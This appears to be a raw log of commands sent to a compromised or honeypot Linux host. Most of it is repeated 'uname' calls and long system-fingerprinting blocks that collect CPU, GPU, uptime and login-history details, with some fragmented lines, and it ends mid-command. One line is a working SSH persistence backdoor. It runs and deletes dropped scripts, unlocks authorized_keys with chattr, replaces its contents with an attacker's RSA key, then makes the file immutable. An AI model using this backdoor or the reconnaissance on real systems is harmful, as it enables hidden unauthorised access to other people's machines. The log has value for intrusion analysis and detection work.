uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
chmod +x clean.sh; sh clean.sh; rm -rf clean.sh; chmod +x setup.sh; sh setup.sh; rm -rf setup.sh; mkdir -p ~/.ssh; chattr -ia ~/.ssh/authorized_keys; echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCqHrvnL6l7rT/mt1AdgdY9tC1GPK216q0q/7neNVqm7AgvfJIM3ZKniGC3S5x6KOEApk+83GM4IKjCPfq007SvT07qh9AscVxegv66I5yuZTEaDAG6cPXxg3/0oXHTOTvxelgbRrMzfU5SEDAEi8+ByKMefE+pDVALgSTBYhol96hu1GthAMtPAFahqxrvaRR4nL4ijxOsmSLREoAb1lxiX7yvoYLT45/1c5dJdrJrQ60uKyieQ6FieWpO2xF6tzfdmHbiVdSmdw0BiCRwe+fuknZYQxIC1owAj2p5bc+nzVTi3mtBEk9rGpgBnJ1hcEUslEf/zevIcX8+6H7kUMRr rsa-key-20230629" > ~/.ssh/authorized_keys; chattr +ai ~/.ssh/authorized_keys; uname -a; echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A"
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -m
uname -s -m
uname -s -m
uname -a
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n5);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$((last | tail -n 10) || last);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n5);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$((last | tail -n 10) || last);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n5);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$((last | tail -n 10) || last);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n5);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$((last | tail -n 10) || last);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n5);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$((last | tail -n 10) || last);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n5);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$((last | tail -n 10) || last);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n5);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$((last | tail -n 10) || last);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n5);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$((last | tail -n 10) || last);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n5);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$((last | tail -n 10) || last);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n5);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$((last | tail -n 10) || last);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		